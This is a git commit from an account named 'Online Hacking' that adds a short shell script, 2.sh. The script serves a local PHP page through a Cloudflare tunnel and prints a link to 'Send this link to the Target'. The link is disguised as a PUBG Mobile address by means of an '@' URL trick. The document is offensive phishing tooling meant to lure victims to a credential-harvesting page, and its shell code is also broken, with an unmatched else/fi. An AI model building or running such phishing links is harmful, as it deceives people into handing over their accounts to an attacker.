f245613156f1ca71220c30abc17b58b2abe77396
Online Hacking <45653647+OnlineHacKing@users.noreply.github.com>
2022-01-09 12:26:38 +0530

    Create 2.sh

---
+++ 2.sh
@@ -0,0 +1,16 @@
+echo ""
+			   php -S 127.0.0.1:4444 > /dev/null 2>&1 &
+			   ./cloudflared tunnel -url 127.0.0.1:4444 --logfile log.txt > /dev/null 2>&1 &
+			   link=$("cat $HOME/log.txt | grep -o 'https://[-0-9a-z]*\.trycloudflare.com'")
+                           sleep 3
+                           echo ""
+                           
+                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
+                           printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://www.pubgmobile.com-@$link                                    
+                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
+                           else
+                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
+                           printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://$link
+                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
+                           fi
+			   echo ""
